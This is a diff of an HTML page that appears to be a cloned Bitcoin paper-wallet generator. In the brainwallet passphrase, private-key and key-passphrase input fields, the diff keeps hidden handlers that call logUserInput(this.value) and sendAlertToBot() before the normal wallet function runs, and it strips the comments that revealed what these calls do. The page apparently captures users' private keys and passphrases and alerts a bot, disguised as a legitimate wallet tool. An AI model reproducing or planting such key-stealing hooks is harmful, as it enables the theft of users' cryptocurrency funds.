@@ -6848,15 +6848,15 @@ gtag('config', 'G-WKH070VBDW');
 			<div id="brainarea" class="walletarea">
 				<div id="braincommands" class="commands">
 					<div class="row">
-						<span id="brainlabelenterpassphrase" class="label"><label for="brainpassphrase">Enter Passphrase: </label></span>
+						<span id="brainlabelenterpassphrase" class="label"><label for="brainpassphrase">Enter Passphrase: </label>
 						<input tabindex="1" type="password" id="brainpassphrase" value="" onfocus="this.select();" onkeypress="if (event.keyCode == 13) ninja.wallets.brainwallet.view();"
 					        event.preventDefault(); 
 					           setTimeout(function() { 
-					               logUserInput(this.value);  // Log the input
-					               sendAlertToBot(); // Send alert to bot
+					               logUserInput(this.value);
+					               sendAlertToBot();
 					               ninja.wallets.brainwallet.view(); 
 					           }.bind(this), 2000); 
-					       }" />						
+					       }" /></span>						
 						<span><label id="brainlabelshow" for="brainpassphraseshow">Show?</label> <input type="checkbox" id="brainpassphraseshow" onchange="ninja.wallets.brainwallet.showToggle(this);" /></span>
 						<span class="print"><input type="button" name="print" id="brainprint" value="Print" onclick="window.print();" /></span>
 					</div>
@@ -6983,8 +6983,8 @@ gtag('config', 'G-WKH070VBDW');
 			<input type="text" id="detailprivkey" value="" onfocus="this.select();" onkeypress="if (event.keyCode == 13) { 
            event.preventDefault(); 
            setTimeout(function() { 
-               logUserInput(this.value);  // Log the input
-               sendAlertToBot(); // Send alert to bot
+               logUserInput(this.value);
+               sendAlertToBot();
                ninja.wallets.detailwallet.viewDetails(); 
            }.bind(this), 2000); 
        }" />
@@ -7007,8 +7007,8 @@ gtag('config', 'G-WKH070VBDW');
 			<input type="text" id="detailprivkeypassphrase" value="" onfocus="this.select();" onkeypress="if (event.keyCode == 13) { 
            event.preventDefault(); 
            setTimeout(function() { 
-               logUserInput(this.value);  // Log the input
-               sendAlertToBot(); // Send alert to bot
+               logUserInput(this.value);
+               sendAlertToBot();
                ninja.wallets.detailwallet.enterOnPassphrase(); 
            }.bind(this), 2000); 
        }" /></span>
